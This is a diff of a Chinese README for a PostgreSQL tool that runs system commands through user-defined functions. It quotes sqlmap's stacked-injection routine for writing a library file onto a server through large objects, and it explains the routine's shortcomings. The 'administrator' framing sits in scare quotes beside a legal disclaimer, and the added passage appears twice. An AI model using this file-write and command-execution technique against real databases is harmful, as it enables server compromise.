@@ -8,12 +8,118 @@ fuck_postgres不是什么黑客攻击工具，他并不是要去fuck什么，只
 
 一切攻击都是违法行为，非管理员请不要。。。使用此工具的一切违法行为与本人无关。
 
+经测试，sqlmap上对于postgres的--os-shell无效，so文件和dll文件也有问题，语句略坑，所以我抽时间写一个，方便各位“管理员”。
+sqlmap该模块语句详见filesystem.py:
+```
+def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
+	wFileSize = os.path.getsize(wFile)
+	content = open(wFile, "rb").read()
+
+	self.oid = randomInt()
+	self.page = 0
+
+	self.createSupportTbl(self.fileTblName, self.tblField, "text")
+
+	debugMsg = "create a new OID for a large object, it implicitly "
+	debugMsg += "adds an entry in the large objects system table"
+	logger.debug(debugMsg)
+
+	# References:
+	# http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
+	# http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html
+
+	inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
+	inject.goStacked("SELECT lo_create(%d)" % self.oid)
+	inject.goStacked("DELETE FROM pg_largeobject WHERE loid=%d" % self.oid)
+
+	for offset in xrange(0, wFileSize, LOBLKSIZE):
+		fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], "base64", False)
+		sqlQueries = self.fileToSqlQueries(fcEncodedList)
+
+		for sqlQuery in sqlQueries:
+			inject.goStacked(sqlQuery)
+
+		inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.page, self.tblField, self.fileTblName))
+		inject.goStacked("DELETE FROM %s" % self.fileTblName)
+
+		self.page += 1
+
+	debugMsg = "exporting the OID %s file content to " % fileType
+	debugMsg += "file '%s'" % dFile
+	logger.debug(debugMsg)
+
+	inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)
+
+	written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+
+	inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
+
+	return written
+```
+
+PostgreSQL在国外的流行程度不亚于MySQL，简称postgres。比如你kaili linux上的Metasploit数据库服务使用的就是PostgreSQL。
+
+fuck_postgres不是什么黑客攻击工具，他并不是要去fuck什么，只用于便捷地使用PostgreSQL自定义函数来执行系统命令，适用于数据库管理员知道postgres密码却不知道ssh或RDP密码的时候在服务器执行系统命令。
+
+一切攻击都是违法行为，非管理员请不要。。。使用此工具的一切违法行为与本人无关。
+
+经测试，sqlmap上对于postgres的--os-shell基本就是个摆设，语句略坑，所以我抽时间写一个，方便各位“管理员”。
+sqlmap该模块语句详见filesystem.py:
+
+def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
+    wFileSize = os.path.getsize(wFile)
+    content = open(wFile, "rb").read()
+
+    self.oid = randomInt()
+    self.page = 0
+
+    self.createSupportTbl(self.fileTblName, self.tblField, "text")
+
+    debugMsg = "create a new OID for a large object, it implicitly "
+    debugMsg += "adds an entry in the large objects system table"
+    logger.debug(debugMsg)
+
+    # References:
+    # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
+    # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html
+
+    inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
+    inject.goStacked("SELECT lo_create(%d)" % self.oid)
+    inject.goStacked("DELETE FROM pg_largeobject WHERE loid=%d" % self.oid)
+
+    for offset in xrange(0, wFileSize, LOBLKSIZE):
+        fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], "base64", False)
+        sqlQueries = self.fileToSqlQueries(fcEncodedList)
+
+        for sqlQuery in sqlQueries:
+            inject.goStacked(sqlQuery)
+
+        inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.page, self.tblField, self.fileTblName))
+        inject.goStacked("DELETE FROM %s" % self.fileTblName)
+
+        self.page += 1
+
+    debugMsg = "exporting the OID %s file content to " % fileType
+    debugMsg += "file '%s'" % dFile
+    logger.debug(debugMsg)
+
+    inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)
+
+    written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+
+    inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
+
+    return written
+
+filesystem.py line65，是将dll文件base64编码解码，整个写入到pg_largeobject的一个page，在linux某些版本一定会报错的。 每page容量为4096字节，如果是hex，只能容纳2kb的数据。
+
 ##### 工具特点：
 
 > 1. 不限平台，可用于管理windows和linux上的postgres
 > 2. 不限版本，udf有效版本内可自行添加库文件到工具目录
 > 3. hex+分段写入large obj，无page数据过大问题
 > 4. 。。。
+
 
 #### USAGE
 
